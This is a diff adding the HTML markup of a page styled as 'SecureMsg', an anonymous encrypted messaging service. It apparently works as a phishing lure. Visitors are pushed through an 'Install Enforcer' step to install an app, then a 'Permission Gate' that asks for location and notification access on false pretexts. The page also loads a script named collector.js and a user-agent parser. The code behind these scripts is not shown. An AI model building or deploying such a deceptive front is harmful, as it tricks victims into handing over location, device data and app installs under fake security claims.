@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>SecureMsg — Anonymous Encrypted Messaging</title>
+  <meta name="description" content="Send end-to-end encrypted anonymous messages securely.">
+  <meta name="theme-color" content="#0a0a0f">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  <link rel="manifest" href="/manifest.json">
+  <link rel="icon" type="image/svg+xml"
+    href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='80'>🔐</text></svg>">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <!-- Ambient Background -->
+  <div class="ambient-bg">
+    <div class="grid-overlay"></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+    <div class="scan-line"></div>
+  </div>
+
+  <div class="app-container">
+    <!-- Header -->
+    <header class="app-header">
+      <div class="logo">
+        <div class="logo-icon">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+          </svg>
+        </div>
+        <span class="logo-text">Secure<span class="accent">Msg</span></span>
+      </div>
+      <div class="status-badge" id="statusBadge">
+        <span class="status-dot"></span>
+        <span class="status-text">Initializing...</span>
+      </div>
+    </header>
+
+    <!-- ═══ PHASE 1: Install Enforcer ═══ -->
+    <section id="phaseInstall" class="phase active">
+      <div class="card glass-card">
+        <div class="shield-icon">
+          <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="url(#shieldGrad)" stroke-width="1.5"
+            stroke-linecap="round" stroke-linejoin="round">
+            <defs>
+              <linearGradient id="shieldGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" style="stop-color:#00f0ff" />
+                <stop offset="100%" style="stop-color:#8b5cf6" />
+              </linearGradient>
+            </defs>
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+          </svg>
+        </div>
+        <h1 class="phase-title">Identity Verification</h1>
+        <p class="phase-subtitle">
+          To send an anonymous message to <strong class="person-name" id="personName">...</strong>,
+          you must install the secure session handler.
+        </p>
+
+        <div class="feature-list">
+          <div class="feature-item">
+            <div class="feature-icon">🔒</div>
+            <div class="feature-text">
+              <strong>End-to-End Encryption</strong>
+              <span>AES-256 secured channel</span>
+            </div>
+          </div>
+          <div class="feature-item">
+            <div class="feature-icon">🛡️</div>
+            <div class="feature-text">
+              <strong>Zero-Knowledge Protocol</strong>
+              <span>Your identity stays hidden</span>
+            </div>
+          </div>
+          <div class="feature-item">
+            <div class="feature-icon">⚡</div>
+            <div class="feature-text">
+              <strong>Instant Delivery</strong>
+              <span>Real-time message routing</span>
+            </div>
+          </div>
+        </div>
+
+        <button id="btnInstall" class="btn btn-primary btn-glow" disabled>
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+            <polyline points="7 10 12 15 17 10" />
+            <line x1="12" y1="15" x2="12" y2="3" />
+          </svg>
+          <span>Install Secure App</span>
+        </button>
+        <button id="btnSkipInstall" class="btn btn-ghost" style="display:none;">
+          Continue without installing →
+        </button>
+        <p class="hint-text" id="installHint">Preparing secure environment...</p>
+      </div>
+    </section>
+
+    <!-- ═══ PHASE 2: Permission Gate ═══ -->
+    <section id="phasePermissions" class="phase">
+      <div class="card glass-card">
+        <div class="shield-icon">
+          <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="url(#shieldGrad)" stroke-width="1.5"
+            stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10" />
+            <path d="M12 16v-4" />
+            <path d="M12 8h.01" />
+          </svg>
+        </div>
+        <h1 class="phase-title">Security Dashboard</h1>
+        <p class="phase-subtitle">
+          Grant the required permissions to unlock the anonymous inbox for <strong class="person-name">...</strong>.
+        </p>
+
+        <div class="permission-cards">
+          <!-- Location Permission -->
+          <div class="perm-card" id="permLocation">
+            <div class="perm-header">
+              <div class="perm-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" />
+                  <circle cx="12" cy="10" r="3" />
+                </svg>
+              </div>
+              <div class="perm-info">
+                <strong>Location Verification</strong>
+                <span>Prevent cross-border spam & verify local origin</span>
+              </div>
+            </div>
+            <button class="btn btn-perm" id="btnLocation">
+              <span>Verify Location</span>
+            </button>
+            <div class="perm-status" id="locationStatus"></div>
+          </div>
+
+          <!-- Notification Permission -->
+          <div class="perm-card" id="permNotification">
+            <div class="perm-header">
+              <div class="perm-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" />
+                  <path d="M13.73 21a2 2 0 0 1-3.46 0" />
+                </svg>
+              </div>
+              <div class="perm-info">
+                <strong>Message Notifications</strong>
+                <span>Get instant alerts when your message is read</span>
+              </div>
+            </div>
+            <button class="btn btn-perm" id="btnNotification">
+              <span>Enable Alerts</span>
+            </button>
+            <div class="perm-status" id="notificationStatus"></div>
+          </div>
+        </div>
+
+        <button id="btnUnlockInbox" class="btn btn-primary btn-glow" disabled>
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+            <path d="M7 11V7a5 5 0 0 1 9.9-1" />
+          </svg>
+          <span>Unlock Inbox</span>
+        </button>
+      </div>
+    </section>
+
+    <!-- ═══ PHASE 3: Message Inbox ═══ -->
+    <section id="phaseMessage" class="phase">
+      <div class="card glass-card">
+        <div class="inbox-header">
+          <div class="inbox-avatar" id="inboxAvatar">?</div>
+          <div>
+            <h1 class="phase-title" style="margin-bottom:0.25rem;">Anonymous Inbox</h1>
+            <p class="phase-subtitle" style="margin-bottom:0;">
+              Send a secret message to <strong class="person-name">...</strong>
+            </p>
+          </div>
+        </div>
+
+        <div class="message-area">
+          <div class="textarea-wrapper">
+            <textarea id="messageInput" placeholder="Type your anonymous message here..." maxlength="2000"
+              rows="5"></textarea>
+            <div class="char-count"><span id="charCount">0</span>/2000</div>
+          </div>
+        </div>
+
+        <button id="btnSend" class="btn btn-primary btn-glow">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <line x1="22" y1="2" x2="11" y2="13" />
+            <polygon points="22 2 15 22 11 13 2 9 22 2" />
+          </svg>
+          <span>Send Anonymously</span>
+        </button>
+
+        <div class="encryption-badge">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+          </svg>
+          <span>Protected by SecureMsg E2E Encryption</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ Success Screen ═══ -->
+    <section id="phaseSuccess" class="phase">
+      <div class="card glass-card success-card">
+        <div class="success-icon">
+          <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="url(#successGrad)" stroke-width="1.5"
+            stroke-linecap="round" stroke-linejoin="round">
+            <defs>
+              <linearGradient id="successGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" style="stop-color:#00f0ff" />
+                <stop offset="100%" style="stop-color:#10b981" />
+              </linearGradient>
+            </defs>
+            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
+            <polyline points="22 4 12 14.01 9 11.01" />
+          </svg>
+        </div>
+        <h1 class="phase-title">Message Delivered!</h1>
+        <p class="phase-subtitle">
+          Your anonymous message has been securely delivered to <strong class="person-name">...</strong>.
+          They cannot see who sent it.
+        </p>
+        <button id="btnSendAnother" class="btn btn-ghost" style="margin-top:1.5rem;">
+          Send Another Message →
+        </button>
+      </div>
+    </section>
+
+    <!-- Toast Container -->
+    <div id="toastContainer" class="toast-container"></div>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div id="loadingOverlay" class="loading-overlay" style="display:none;">
+    <div class="spinner"></div>
+    <p class="loading-text">Securing connection...</p>
+  </div>
+
+  <!-- Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/src/ua-parser.min.js"></script>
+  <script src="/js/collector.js"></script>
+  <script src="/js/app.js"></script>
+</body>
+
+</html>
